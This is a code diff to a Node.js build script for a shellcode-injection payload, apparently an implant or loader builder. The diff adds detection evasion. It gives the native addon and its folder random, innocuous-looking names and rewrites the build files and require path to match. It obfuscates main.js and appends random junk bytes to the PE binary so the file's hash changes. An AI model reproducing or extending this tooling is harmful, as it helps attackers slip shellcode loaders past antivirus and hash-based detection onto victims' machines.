@@ -74,22 +74,99 @@ async function main() {
     console.log(`  Jitter:          ${config.jitter}s`);
     console.log('');
 
-    // Build native addon
+    // Generate random module name and folder name
+    const randomModuleName = generateRandomModuleName();
+    const randomFolderName = generateRandomModuleName();
+    console.log(`[+] Generated random module name: ${randomModuleName}`);
+    console.log(`[+] Generated random folder name: ${randomFolderName}`);
+    console.log('');
+
+    // Build native addon with random name
     console.log('[+] Building native shellcode injection addon...');
     try {
+        // Update binding.gyp and inject.cc with random module name
+        updateModuleName(randomModuleName);
+        
         execSync('npm run build:addon', { stdio: 'inherit' });
         console.log('');
+        
+        // Restore original files
+        restoreModuleName();
     } catch (err) {
+        // Restore original files even on error
+        restoreModuleName();
         console.error('\n[!] Native addon build failed!');
         console.error('[!] Make sure you have Visual Studio Build Tools installed.');
         console.error('[!] Download from: https://visualstudio.microsoft.com/downloads/');
         process.exit(1);
     }
 
-    buildPayload(config, JavaScriptObfuscator);
+    buildPayload(config, JavaScriptObfuscator, randomModuleName, randomFolderName);
 }
 
-function buildPayload(config, JavaScriptObfuscator) {
+function generateRandomModuleName() {
+    const prefixes = ['util', 'helper', 'core', 'lib', 'mod', 'ext', 'sys', 'app'];
+    const suffixes = ['loader', 'manager', 'handler', 'service', 'module', 'addon', 'plugin', 'tool'];
+    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
+    const randomNum = Math.floor(Math.random() * 1000);
+    
+    // Randomly order the components: prefix, number, suffix
+    const components = [
+        { type: 'prefix', value: prefix },
+        { type: 'number', value: randomNum.toString() },
+        { type: 'suffix', value: suffix }
+    ];
+    
+    // Shuffle the array randomly
+    for (let i = components.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [components[i], components[j]] = [components[j], components[i]];
+    }
+    
+    // Join the shuffled components
+    return components.map(c => c.value).join('');
+}
+
+function updateModuleName(moduleName) {
+    const bindingGypPath = path.join(__dirname, 'binding.gyp');
+    const injectCcPath = path.join(__dirname, 'inject.cc');
+    
+    // Backup original files
+    if (!fs.existsSync(bindingGypPath + '.bak')) {
+        fs.copyFileSync(bindingGypPath, bindingGypPath + '.bak');
+    }
+    if (!fs.existsSync(injectCcPath + '.bak')) {
+        fs.copyFileSync(injectCcPath, injectCcPath + '.bak');
+    }
+    
+    // Update binding.gyp
+    let bindingGyp = fs.readFileSync(bindingGypPath, 'utf-8');
+    bindingGyp = bindingGyp.replace(/"target_name":\s*"inject"/, `"target_name": "${moduleName}"`);
+    fs.writeFileSync(bindingGypPath, bindingGyp);
+    
+    // Update inject.cc
+    let injectCc = fs.readFileSync(injectCcPath, 'utf-8');
+    injectCc = injectCc.replace(/NODE_API_MODULE\(inject,\s*Init\)/g, `NODE_API_MODULE(${moduleName}, Init)`);
+    fs.writeFileSync(injectCcPath, injectCc);
+}
+
+function restoreModuleName() {
+    const bindingGypPath = path.join(__dirname, 'binding.gyp');
+    const injectCcPath = path.join(__dirname, 'inject.cc');
+    
+    // Restore from backup if exists
+    if (fs.existsSync(bindingGypPath + '.bak')) {
+        fs.copyFileSync(bindingGypPath + '.bak', bindingGypPath);
+        fs.unlinkSync(bindingGypPath + '.bak');
+    }
+    if (fs.existsSync(injectCcPath + '.bak')) {
+        fs.copyFileSync(injectCcPath + '.bak', injectCcPath);
+        fs.unlinkSync(injectCcPath + '.bak');
+    }
+}
+
+function buildPayload(config, JavaScriptObfuscator, moduleName, folderName) {
 
 // Directories
 const sourceDir = __dirname;
@@ -169,6 +246,12 @@ if (config.ua) {
     );
 }
 
+// Replace inject module name and path with random names
+mainCode = mainCode.replace(
+    /require\(['"]\.\/build\/Release\/inject\.node['"]\)/g,
+    `require('./${folderName}/${moduleName}.node')`
+);
+
 // Obfuscate main.js
 console.log('[+] Obfuscating main.js...');
 const obfuscatedMain = JavaScriptObfuscator.obfuscate(mainCode, {
@@ -182,32 +265,32 @@ const obfuscatedMain = JavaScriptObfuscator.obfuscate(mainCode, {
 }).getObfuscatedCode();
 fs.writeFileSync(path.join(outputDir, 'main.js'), obfuscatedMain);
 
-// Modify inject.node PE binary to change hash
-const injectSrc = path.join(buildDir, 'inject.node');
-const injectDst = path.join(outputDir, 'inject.node');
+// Modify module.node PE binary to change hash
+const moduleSrc = path.join(buildDir, `${moduleName}.node`);
+const moduleDst = path.join(outputDir, `${moduleName}.node`);
 
-if (fs.existsSync(injectSrc)) {
-    console.log('[+] Modifying inject.node hash...');
+if (fs.existsSync(moduleSrc)) {
+    console.log(`[+] Modifying ${moduleName}.node hash...`);
     
-    const injectBuffer = fs.readFileSync(injectSrc);
+    const moduleBuffer = fs.readFileSync(moduleSrc);
     
     // Append random junk bytes to change hash
     const junkBytes = crypto.randomBytes(256);
-    const modifiedBuffer = Buffer.concat([injectBuffer, junkBytes]);
+    const modifiedBuffer = Buffer.concat([moduleBuffer, junkBytes]);
     
-    fs.writeFileSync(injectDst, modifiedBuffer);
+    fs.writeFileSync(moduleDst, modifiedBuffer);
     
-    console.log(`    Original hash: ${hashFile(injectSrc).substring(0, 16)}...`);
-    console.log(`    Modified hash: ${hashFile(injectDst).substring(0, 16)}...`);
+    console.log(`    Original hash: ${hashFile(moduleSrc).substring(0, 16)}...`);
+    console.log(`    Modified hash: ${hashFile(moduleDst).substring(0, 16)}...`);
 } else {
-    console.error('[!] inject.node not found. Make sure to build the native addon first.');
+    console.error(`[!] ${moduleName}.node not found. Make sure to build the native addon first.`);
     process.exit(1);
 }
 
-// Create build directory structure
-fs.mkdirSync(path.join(outputDir, 'build', 'Release'), { recursive: true });
-fs.copyFileSync(injectDst, path.join(outputDir, 'build', 'Release', 'inject.node'));
-fs.unlinkSync(injectDst);
+// Create random folder directory structure
+fs.mkdirSync(path.join(outputDir, folderName), { recursive: true });
+fs.copyFileSync(moduleDst, path.join(outputDir, folderName, `${moduleName}.node`));
+fs.unlinkSync(moduleDst);
 
 // Generate randomized package.json
 console.log('[+] Generating randomized package.json...');
